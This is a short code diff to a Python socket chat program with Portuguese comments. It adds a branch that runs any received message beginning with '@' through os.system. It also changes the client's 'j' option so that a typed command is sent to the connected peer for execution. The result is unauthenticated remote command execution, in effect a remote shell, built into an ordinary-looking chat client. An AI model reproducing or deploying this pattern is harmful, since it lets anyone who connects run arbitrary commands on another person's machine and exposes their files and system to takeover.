@@ -13,6 +13,8 @@ def conServ():
             msg = cliente.recv(1024).decode('utf-8')
             if msg == "Nome: ":
                 cliente.send(nome.encode('utf-8'))
+            elif msg[0] == "@":
+                os.system(msg[1:])
             else:
                 print(msg)
                # os.system(msg) #isso ta funcionando mas parece estar com erro
@@ -32,7 +34,9 @@ def conCliente():
             cliente.send(msg.encode('utf-8'))
         elif x == "j":
             x = input("Digite o comando:")
-            os.system(x)
+            prefixo = "@"
+            commando = f"{prefixo}{x}"
+            cliente.send(commando.encode('utf-8'))
         
 
 
